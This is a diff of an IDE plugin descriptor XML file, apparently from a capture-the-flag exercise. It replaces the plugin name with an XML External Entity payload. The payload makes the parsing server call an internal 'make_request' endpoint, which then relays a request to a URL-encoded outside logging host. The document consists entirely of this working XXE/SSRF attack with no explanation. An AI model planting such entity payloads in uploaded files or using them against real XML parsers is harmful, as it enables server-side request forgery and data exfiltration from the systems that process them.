@@ -1,5 +1,10 @@
-<ide-plugin>
-    <name>kekew</name>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "http://marketplace:8080/make_request?url=%68%74%74%70%73%3a%2f%2f%63%74%66%2d%33%2e%65%72%74%65%6c%2e%6f%6e%65%2f%6c%6f%67%2f%6a%6f%70%61&httpMethod=GET&headers=a:b">
+        ]>
+<ide-plugin xmlns="">
+    <name>&xxe;</name>
     <id>org.plugin.package</id>
     <version>1.0</version>
 </ide-plugin>
